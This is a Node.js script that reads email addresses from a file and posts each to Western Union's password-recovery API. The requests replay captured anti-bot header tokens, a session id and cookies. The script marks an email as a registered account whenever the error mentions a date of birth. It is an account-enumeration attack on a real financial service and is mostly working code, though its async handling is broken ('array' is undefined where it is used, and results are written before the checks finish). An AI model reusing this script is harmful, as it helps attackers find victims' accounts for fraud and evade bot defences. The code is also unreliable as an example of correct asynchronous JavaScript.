
const express = require('express');
path = require('path');
let app = express();
var request = require("request");
var j = request.jar();
var cookies
var client_ip
var session

var fs = require('fs');
var resultArray = [];
function getResult(i) {
    console.log(i);
    if (i >= resultArray.length) return;
    resultCal(array[i]).then(function (resolve) {
        if (resolve)
            resultArray.push(array[i])
        i++
        return getResult(i);
    }).catch(err => {
        console.log(err);
        i++;;
        return getResult(i);
    })
    
}
fs.readFile('file.txt', function (err, data) {
    if (err) throw err;
    var array = data.toString().split("\n");
    var i = 0;
    // do {
    getResult(i);

    // } while (i < array.length)
    var file = fs.createWriteStream('result.txt');
    file.on('error', function (err) { /* error handling */ });
    resultArray.forEach(function (v) {
        file.write(v + '\n');
    });
    file.end();
});
function resultCal(email) {
    return new Promise(function (resolve, reject) {
        var options = {
            method: 'POST',
            url: 'https://www.westernunion.com/wuconnect/rest/api/v1.0/GetUserChallenges',
            qs: { timestamp: '1530540724504' },
            headers:
            {
                'Postman-Token': '6a4e9dee-afef-4d24-aed8-5764c7739af8',
                pragma: 'no-cache',
                'Cache-Control': 'no-cache',
                'x-nyupe9cs-a': 'LdRy-DoQrvHzuKLSRg=1LKqhwW53=fN3f__hwAURxTQEDmEArYN9qMHmq=oiaAz1T6yhgWb-AxKw=KadwpChwcE5q-QPw4opwyilr9mea5uRjgyhwpHlR=S5fRcSe_u_B1BGDmBQct5pafbO6iLixYbhcxywjQuUnB8Iq4v_ZPBy6RoST9KMedSSw91IfRo6wFuHt-QmyEQH3xxhgje=bvyhzYAhzmZSq-Rt3PeEjY1laALwa_zRaQcwqHoVwEMhjgBVr9NzR1cdfAadqIQ-xLuAq-Smr=_1RvHOjgzQwzowcYmZbyV3=mZHuSMhD95mzYaww-ZP0BVpm=ob-MzdBPa8ehOvq0RbDKtUq8yltF_HDmuAcIemjtayjUB1qhAw=MuGebZ=6f=hw0Qm6kCQ9dDR3yxezRt9QRQiR=tv39nyQAovwonprtbwjAOKqDQvh5MhwbmhqvhdXeESI=N=DAtpJgzR3U5HnBgIw5N1QYkir9AMjgQvTg=Sz0qhgdQS6lrZcmby6138Nu_hbgabBfq1qlRtrYihe0cSwbBVA=tp69VGwKtQq3umrpbhzRj8q3Rz2XaQGLomgXkpfRcwfRahwD=SaWuFwX_16iBRqX=wwbj_BZEFc8_hAU3yL8Qlc==HQWBhPXCtNitprxad5RQFugQS6HZATxcww5DhD9PhqYZ=wbZHEQ5SJB=h0XDbfAonzBQS0EkmN3dReHQQWLch00Nzt3bhj6eFSzwE30yhq6qID3ahLW=IjFyuxhztfRQFz3tlaRewtpnvjFlHqK_IxIQ18le3wbHbelt=6XSLedyhxvzpx_hFjpwtq9kvchoEqWjwGPQUbUAos0Rn6ZbTaQOFWR5QeybvTxhW60a-YGyhwXkrQyj1DDmR=mQ8rBAWwALRrY=la5MhezuHj=twqZayzABhzW1Q=mArMUahwit_qdCBTY5LqbzhTWeORdK3aWBhwzFIjYNPey5izbeSJgc1rNk1DfoSwbbdjYtOjLnVwKAhBfQSD9rdrpj_rY3K2=NlzSD3NDyaR-1wzAovngQSAIfIjtshT=t1RfQijxuQtRkmqWuS9Wn3DZKSjLeNNMS3uySPf_hVQUcwr8QOn_H0fxo5qxtv3Ua3r6Qiw3uvpY=1QxopNm6oeQw9jByHfQa3RKu5N5tUDfOvg-RhGXUWwv_hjJoKxbZ1t9ZXTWNm39bqrZlaB8opeR5-=fy1BKBqwWEUfzQHdSD1=mZv=KHPj=aRjYNSrmZmwEDQcUol3b1w6PAHDKQnt=Ov5YrgrZbh3yr-wWuOeWwGWpsWRgyO6XkIfcVdaWw1aWN36G_OtYaQab5ljyQsg6A1aW5lub_X6iaQeBchDfBhqK_1uASI06lnjgzpNdB3TdC1cNh1x9zhfYtG6XDW6sPhx8AwfbFlRWChr3AdkWw369vdnFh-wXuSqiLIr2RhL8bwwWUb4EuHDEhWwR5rw0RgD9Z5zWFSjxWM6IoU6iuQnYDp4XEBz5c1wfRRcNkIeAXIepynGitFrY=d6XCdwMlIfAFIwyqwaAtvD9Z5rBNHRfR9dtchegYIDK=dwzJIz9Cwz3ASylA1nYYS6Xr1uit1LWW8RALHZdnbaurVjbEFRRumrH5QwbNPeTopcXzQxvMIjhQHwiteql=SgeC1Tyyhw_RheAcweWuSkWiw_FHSDMuEnr=1GUcSQt586ixvaykFQRbyDKt8qvlIcgNFaWi-rYHXabNmadljc=LhM9ZoD1oSwWoarfy1qOopApyh=Kchr1NmqJc1NdnEwPR3B8MIw8RZwzemfy6hLmbhzKL9aU1YrKPleAtvGXkmR9eAz1QQgYDyrNkmjInBjxu26yy1RB33ngupAEkXuW1dbiL1eWqwnBNU6pC1RKz3=pQvZfQHD9Np6fywghJCbImRzhyPt-kUQWLSAzeFuAt3jNkFj=a-zNa83JL_w5NSzFQEqtoleWkUtmKdjNj8jHV8eRQvRAu1T6l1oARR3ZAhehcYw=c4wXSpeiunrFucYySUBvuS3tE-w0bbqpCwr-y3TYr50-ESWW=Hpvud6w5Xr3v6qXa8TYDW=9AwaARO3dKRzyaEwdQw60AIqSeIchQ83IRZRgzG3yQHjN6apXNGR-mtGUzQqvuUw3MhzWx16b51eWNOx9jlgxzdQxo1wRcld8SxR_HF3iQScSuFwFhy69NlrLyhjQad69j3aQZpwY3dyYxbwdRQe0AwDfyIbiudGvlhBAa8ezQQ68ahxLuS=fGiAYn1j6chJQvhjYB=DEoHxiaTwAxVrx3RqfQicgN=eWoBLiNvLioszX_5wIRd6Sk4uZQIcXSmRWA1oYNOo9jSx-lwwdhpqWiIjgzQwbwpv8RdjXKhz5nSOLe5RyjmrYw8jxLIrxRyzgaxfJbhcGRtabKhiPygjFzyh05S3_u1qLQLt2oIf__hbiQQe6chDRAHN_Hz68QpqRtSx8Qvj=tmzYH16Aop0PRr=pvSq9LIyWMhbg5zD2o0wbovj9SVbPRZq3b8tfuafyb-tNB3eb6pJYxhN6NEDkoG3itsRFuSfWw1b6onDKaQeA=1jYOzzYERuzy=aRCwnxtdRFz3rZ5Iw15pj6hNngQpRXAhuWII4yUhZvuPqfcIcNk3wNxQRKcdcLABTxuHf0bRwWkLtBKlq8FwqSeRjx5dBIy1t3385WbhB1RZqMllW-mGRmwRbHEvRFuiQY5-DpRlwWz8q0_BeWj8ezopT=aHWY=laA_Jc9bTt=tS3FlXqAQmjbaKTgRhyB1Gq9NvjYllqVvhzAoLdKNvrYNKwQaWrfQh=pUtwSiwppQHwgdhLAy1jBoOzKBGTNQa3KtSw_DQz5kowWz-zyQywz5mTgyhA5LhLR_Wz05ScXB1w958DKHUjlH1tBNSuW3RujcHN1RRfAtBqAL1DKxwb0=brpEXq9whNxk1nIn36IRpfo_Rnrj9w5Hwzh5SjKyhn2oPDmNVz9=wcB5Nb8QEfAtFDDaVDpQ3bXH3=ED8Z9uSR=R1bxA1TBa3Rh5prxyh6ZmzqdR3tpQ86811sJNO6UAhjzFIcUkpfyclxNjwe0Qlf0o=69nEGURhjLQQD9LTj=NFf6AhwMkF69Svq9rTfYUGwb3u=ZbTqitQGtAR6XN1uAahxicwaWvhjYuv3IRQzM_hzWkw-3r4b_zzaW=16VKwwmabw_hRjNtQL5x3dAB3r-QSwyLhcmahevjPRhb9=3Qmab6Tf0a3wdR1-YnOjLQpH8RyxRchwWZvgFlhrBowGdnUjFl1TdRtjtQHVYBpQdSF3_ljA24Ig6Awj-QSwAtzrpnSwHchD1hVjAx8cSFnjlqAJBNOm95BD9Ul4kbycXt3WIHFj-C1r9lhwW2p38QuLyzywPAI-kVFD4Msq8Rhuf5SQKloNdQ8wdnmDfBNzYBQzh5Hu3ySQRuvD151xDxfeRvhgAxwfQmJbt5HmRQvgYma6_u5xYcdq358DMHPn-E3n-yIjxoPetDRDMh3nYD8D95SrSkmdPwEqDsUT-UhgBuzZUZoRiO-3iNw65tlLmeVuPRir2ccq3HFeyVmANaZbiNKbg=1jAhhw_z3wY2sz0kpg__hW8_Sehocxb3QREt8ntBhQXEHR058q8AUzAxZzWDReAByj6QnTW5FeYNAD3yIaWwde0R3DfuST=tBD0QbjLoG6MzGBKtHMCDhcK9eb9v2GU6Ing_1D1tEr=hRr8oHTiQdyxtmfAzcrgylNEciRfBawmbRe-hh6S_lc-yhQKqIwAa1wYk1qmcHDfQGw0oHjYkpG-wW-3cwtYCwMZQmWU5Fcv_cwZE5qXovu8uorFlhjgoVc8RND15QRyMlwxt8zKNmDm1EeusSfBU9fAN=wvzVplxKnxy1jNu1wbtdNR_WjBnAD3Q=wWN1TBNnt9Y2Ghbhz1FID3rbL2o3yKY2TYihe9vwqSkmeRy1gWhvzFHV1L5Pd=LlqNLLjBk1RUA0JBz3T6QHw_uFfdC363tdqWwyj=G8f5HvtBNzeoiIT=tOtKNQrlywbP6R5gbCrX=IwYLU3HcleAaypjuER=epz2QvcUt8fAj1jiQHnFlSLW5iDDn8jy580xovrh3Z6Pz6jAHwZYNOoKoQggRw65eUomQ5q=x8x-KSu0ywj-SSa5=1etHpnL=6bS_lj1rVw9UQ=DQU=f=I6IQmz8zRwXNHdUSEY011eKoSwxzVfRx36vzhfRbbqdRuT=zh695cqnSQjWmRady1wmoIDm5SnxswjgRhRx5dsA=ca3t8wWBQLiuST=LwqPovn=yhN-wga0QSj3OL6Mh8aWB-6XkSYKyd33zha_llpA=1NZRypxorwJOvTYae=mF4wQcwqZ1leW5FudwEuYwVeWhmw9NGjoSlwYWID1jQjYAdxBPk-fR9RKaNwWlIw9_hzRyJ6_kmT5kmNEFG5PLh6h_nc4o5qktvwW5ScYbirT6OcXaWtYn3aWZAw9tQj0_SLpCSRXiajdES68QA=1zJZvhK6PjpwKcwogQ1-MlVD1djrfR1zzt86SQ8rLl3tNN5wdQmTYDG=Z3t=MD-QKtHqm1h6XEHGPo=Ny5XfWJlN5D8BicVw9bknLBOJBNFc1iQebuEeQbDy4cwL=o5N9B8jYch5xxtw4bp63QSfb5XZ_zVxPSp6ixQnYb_cXNVRilkrgAwrBe=ESM1eAe0syQUjdQEL5Mhwf58qLRhAR5y6iz3Y9NFeRxheAoPqh5SxSMw9WD2abQm35kUv0QF-BZOzgR960u_bY1wz1Hm=Mu3eWnOaWEVx8RG64uHdXLhqf5EextUG3QvjBaBa5kX6dQSj-Cwz9sljUopuROlaW_wpFHPz1bJnYwhTpS=dW3NRBi33HnE6PZHwrbdqAt_GhtF3U-TNYcw2v_Hricwz9NBohshRiuHz0Nwed3hJ_HVGKLhezOFCf=lrYkOq3uFN-QGbF_HzKaOwXx8fbuFaW=lpALlw5tERh5ncBV8NKoSuHPhQYbQxSy1uX=-RxQPhyylj6HVRRuvJWARwAchwKuFgzR8zAz3jBkSR3o1q9YItzyR',
                'x-nyupe9cs-b': '-fknw2b',
                'x-nyupe9cs-c': 'AEARsFxkAQAArCdzdVPOQBt_zag0L-Mxt_TEb8K6BsiW23BA20Rau2ei9oBl',
                'x-nyupe9cs-d': 0,
                'x-nyupe9cs-uniquestatekey': 'AEqfxlxkAQAA_T9Yrvqf6Ck_ESAb3KrLdGnIe2OUv34engcmdKDzPNqzXLHX',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36',
                referer: 'https://www.westernunion.com/ES/EN/password-recovery.html',
                origin: 'https://www.westernunion.com',
                // cookie: 'AKCountry=TW; AKZip=; AKRegioncode=; AKCity=TAIPEI; AKAreacode=; AKCounty=; WUCountryCookie_=ES; AK_TLS_Version=tls1.2; resolution_height=800; resolution_width=1280; is_tablet=false; is_mobile=false; BIGipServerwudispatcher.westernunion.com=570502410.36895.0000; SERVER_COOKIE=R4; AMCVS_AACD3BC75245B4940A490D4D%40AdobeOrg=1; _abck=j7z8ri4f0kgkerkhpqge_1932; cachestatus=enabled; s_cc=true; user_txn_state=0:1530512033550; kampyle_userid=36ef-d12a-aad5-37a9-6ce6-0dba-fcd1-9b5b; cd_user_id=16459a0520032e-08275ab80f343b-47e1039-1fa400-16459a05201102f; QuantumMetricUserID=21eb5d6693cb92e3d58c7d611cfffd8d; QuantumMetricSessionID=f930c8f10eb29292ec9bdf652e3146a5; PathContent=/content/wucom/base/es/en; s_sq=%5B%5BB%5D%5D; s_error=C5000%2CC1172; s_t=1530531942099; WULanguageCookie_=EN; CookieOptIn=CKTXNL+CKPERF+CKMKTG; AMCV_AACD3BC75245B4940A490D4D%40AdobeOrg=1099438348%7CMCIDTS%7C17715%7CMCMID%7C00302567015786158761033064356710531361%7CMCAAMLH-1531116829%7C11%7CMCAAMB-1531140891%7CRKhpRz8krg2tLO6pguXWp5olkAcUniQYPHaMWWgdJ3xzPWQmdj0y%7CMCOPTOUT-1530543291s%7CNONE%7CMCAID%7CNONE%7CMCSYNCSOP%7C411-17722%7CvVersion%7C2.1.0; channel_stack=password-recovery|login|password-recovery|login|password-recovery|login|password-recovery|login|password-recovery; JSESSIONID=7vzkdxn6gbej17vdv8nxktgsa; s_dfa=westernunionnewglobal; mbox=PC#e840942bc7134461bc6549949f9343a8.28_13#1593783919|session#72249bcb5e314b3d882dedd5f07ad242#1530540982; kampyleUserSession=1530539122828; kampyleUserSessionsCount=18; kampyleSessionPageCounter=1; kampyleUserPercentile=87.48893931071615; SessionId=web-c17c58b0-4d2f-4642-b721-b7cec2eedbf8; SessionDomain=www.westernunion.com; s_NewRepeateVar=1530540723114-Repeat; s_NewRepeatprop=1530540723115-Repeat; SessionInfo=1530540724502',
                'content-length': '224',
                'accept-language': 'en-US,en;q=0.9',
                'accept-encoding': 'gzip, deflate, br',
                accept: 'application/json',
                'Content-Type': 'application/json'
            },
            body:
            {
                bashPath: '/ES/EN/',
                external_reference_no: '1',
                gateway_customer: { email: email, date_of_birth: '1990-03-04' },
                security:
                {
                    session: { id: 'web-1721492d-2a5e-463b-ad4b-89baeb26d70e' },
                    client_ip: '184075215197'
                }
            },
            json: true,
            jar: j
        };

        request(options, function (error, response, body) {
            if (error) throw new Error(error);
            cookies = j.getCookies('https://www.westernunion.com/wuconnect/rest/api/v1.0/GetUserChallenges');

            if (body.error.message.includes("birth") || body.error.message.includes("date")) {
                resolve(true)
                // res.send("" + req.query.email + "  was registered");
            }
            else {
                reject(Error("It broke"))
                // res.send("" + req.query.email + "  was not registered");
            }
            console.log(body);
        });
    })


}
module.exports = app;